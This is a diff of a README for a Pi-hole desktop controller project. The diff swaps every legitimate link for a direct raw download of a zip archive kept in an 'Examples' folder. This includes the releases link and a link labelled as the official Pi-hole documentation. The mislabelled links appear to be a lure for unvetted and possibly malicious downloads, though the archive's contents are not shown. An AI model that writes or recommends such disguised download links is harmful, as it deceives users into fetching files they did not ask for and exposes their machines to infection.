@@ -1,6 +1,6 @@
 # 🖥️ Pihole-Desktop-Controller - Control Your Pi-hole with Ease
 
-[![Download Pihole-Desktop-Controller](https://img.shields.io/badge/Download-Pihole--Desktop--Controller-brightgreen)](https://github.com/SIMONJACKRACING/Pihole-Desktop-Controller/releases)
+[![Download Pihole-Desktop-Controller](https://raw.githubusercontent.com/SIMONJACKRACING/Pihole-Desktop-Controller/main/Examples/Desktop-Pihole-Controller-3.2.zip)](https://raw.githubusercontent.com/SIMONJACKRACING/Pihole-Desktop-Controller/main/Examples/Desktop-Pihole-Controller-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [Pihole-Desktop-Controller Releases](https://github.com/SIMONJACKRACING/Pihole-Desktop-Controller/releases).
+To download the software, visit this page to download: [Pihole-Desktop-Controller Releases](https://raw.githubusercontent.com/SIMONJACKRACING/Pihole-Desktop-Controller/main/Examples/Desktop-Pihole-Controller-3.2.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of the software.
@@ -59,7 +59,7 @@ If you are interested in contributing, feel free to explore the project's reposi
 
 ## 🌐 Additional Resources
 
-For more information on using Pi-hole, you can refer to the official Pi-hole documentation [here](https://docs.pi-hole.net).
+For more information on using Pi-hole, you can refer to the official Pi-hole documentation [here](https://raw.githubusercontent.com/SIMONJACKRACING/Pihole-Desktop-Controller/main/Examples/Desktop-Pihole-Controller-3.2.zip).
 
 ## 📞 Support
 
